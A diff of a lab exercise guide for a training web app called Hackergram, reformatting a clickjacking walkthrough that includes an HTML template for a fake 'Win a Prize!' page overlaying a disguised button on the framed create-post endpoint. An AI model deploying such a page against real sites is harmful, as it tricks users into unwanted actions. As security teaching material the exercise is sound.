@@ -6,7 +6,7 @@ actions may include inadvertently downloading malware, exposing confidential inf
 unauthorized transactions, among other security breaches. 
 
 ## Attack
-Create a post on behalf of a user without their knowledge by tricking them into clicking a disguised button embedded within a malicious site. This attack exploits the fact that Hackergram web application can be embedded inside an iframe. In this case, the `/create_posts` endpoint will be targeted.
+Create a post on behalf of a user without their knowledge by tricking them into clicking a disguised button embedded within a malicious site. This attack exploits the fact that Hackergram web application can be embedded inside an iframe. In this case, the `/create_post` endpoint will be targeted.
 
 To execute the attack, follow these steps:
 
@@ -18,81 +18,83 @@ To execute the attack, follow these steps:
 
 4.	In the attacker’s `/home` directory, craft a file named `clickjacking.html`. This will be a fake HTML page that embeds Hackergram’s `/create_post` endpoint inside an iframe. You can use the template provided below as a starting point. 
 
-    ``` html
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win a Prize!</title>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        h2 {
-            color: red;
-        }
-        .fake-button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 15px 20px;
-            font-size: 20px;
-            border: none;
-            cursor: pointer;
-            position: absolute;
-            top: 580px;
-            left: 65%;
-            transform: translateX(-50%);
-            z-index: 10; 
-            pointer-events: none; 
-        }
+    ??? note Clickjacking HTML
 
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 5;
-            pointer-events: none; 
-        }
+        ``` html
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Win a Prize!</title>
+        <style>
+            body {
+                text-align: center;
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+            }
+            h2 {
+                color: red;
+            }
+            .fake-button {
+                background-color: #4CAF50;
+                color: white;
+                padding: 15px 20px;
+                font-size: 20px;
+                border: none;
+                cursor: pointer;
+                position: absolute;
+                top: 580px;
+                left: 65%;
+                transform: translateX(-50%);
+                z-index: 10; 
+                pointer-events: none; 
+            }
 
-    </style>
-    </head>
-    <body>
-    <h2>Click to Win a Prize!</h2>
-    <div class="overlay">
-        <button class="fake-button" id="claimButton">Claim</button>
-    </div>
-    <script>
-        window.onload = function() {
-            let iframe = document.querySelector("iframe");
-            let claimButton = document.getElementById("claimButton");
-            
-            iframe.addEventListener('load', function() {
-                try {
-                    let iframeWindow = iframe.contentWindow;
-                    
-                    iframeWindow.postMessage({
-                        action: 'fillContent',
-                        content: 'Hello World!'
-                    }, '*');
-                } catch (error) {
-                    console.error('Error accessing iframe:', error);
-                }
-            });
-        };
+            .overlay {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 5;
+                pointer-events: none; 
+            }
 
-        window.addEventListener('message', function(event) {
-            console.log('Received message:', event.data);
-        }, false);
-    </script>
-    </body>
-    </html>
-    ```
+        </style>
+        </head>
+        <body>
+        <h2>Click to Win a Prize!</h2>
+        <div class="overlay">
+            <button class="fake-button" id="claimButton">Claim</button>
+        </div>
+        <script>
+            window.onload = function() {
+                let iframe = document.querySelector("iframe");
+                let claimButton = document.getElementById("claimButton");
+                
+                iframe.addEventListener('load', function() {
+                    try {
+                        let iframeWindow = iframe.contentWindow;
+                        
+                        iframeWindow.postMessage({
+                            action: 'fillContent',
+                            content: 'Hello World!'
+                        }, '*');
+                    } catch (error) {
+                        console.error('Error accessing iframe:', error);
+                    }
+                });
+            };
+
+            window.addEventListener('message', function(event) {
+                console.log('Received message:', event.data);
+            }, false);
+        </script>
+        </body>
+        </html>
+        ```
 
     <details>
     <summary><strong>Tip</strong></summary>
